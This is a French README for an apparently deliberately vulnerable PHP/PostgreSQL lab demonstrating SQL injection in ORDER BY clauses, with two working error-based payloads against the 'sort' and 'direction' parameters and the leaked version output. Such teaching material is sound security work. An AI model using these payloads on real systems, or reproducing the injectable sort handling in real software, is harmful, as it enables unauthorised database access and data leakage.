# PoC - Exploitation des injections SQL dans les clauses ORDER BY

## Installation

```
$ docker-compose build
$ docker-compose up -d
```

![image](https://github.com/user-attachments/assets/39419bea-36df-4182-a049-6e86d2c2a09a)

## Description

L'application, développée en PHP avec l'extension PDO, permet de rechercher des utilisateurs présents dans une base de données PostgreSQL. Toutefois, les paramètres "sort" et "direction" utilisés au sein de la clause `ORDER BY` lors de l'appel à l'API sont sensibles aux injections SQL.

## Exploitation

Récupération de la version du système de base de données via le paramètre "sort" :

```sql
/users?search=&sort=(CAST((SELECT VERSION()) AS NUMERIC))&direction=ASC&page=1&maxPerPage=5
```

```
Error: SQLSTATE[22P02]: Invalid text representation: 7 ERROR:  invalid input syntax for type numeric: "PostgreSQL 15.7 (Debian 15.7-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit"
```

Récupération de la version du système de base de données via le paramètre "direction" :

```sql
/users?search=&sort=username&direction=ASC,(CAST((SELECT VERSION()) AS NUMERIC))&page=1&maxPerPage=5
```

```
Error: SQLSTATE[22P02]: Invalid text representation: 7 ERROR:  invalid input syntax for type numeric: "PostgreSQL 15.7 (Debian 15.7-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit"
```

## Démo

![](https://github.com/Sharpforce/cybersecurity-code/blob/main/exploitation-des-injections-sql-au-sein-de-la-clause-order-by/PHP-PDO-et-PostgreSQL/demo/demo.gif)

## Disclaimer

Cet outil est destiné uniquement à des fins éducatives et doit être utilisé uniquement dans des environnements de tests de pénétration autorisés. L'accès ou l'utilisation non autorisés de systèmes que vous ne possédez pas est illégal. L'auteur n'est pas responsable de toute utilisation abusive de cet outil.

## License

Ce projet est sous licence MIT.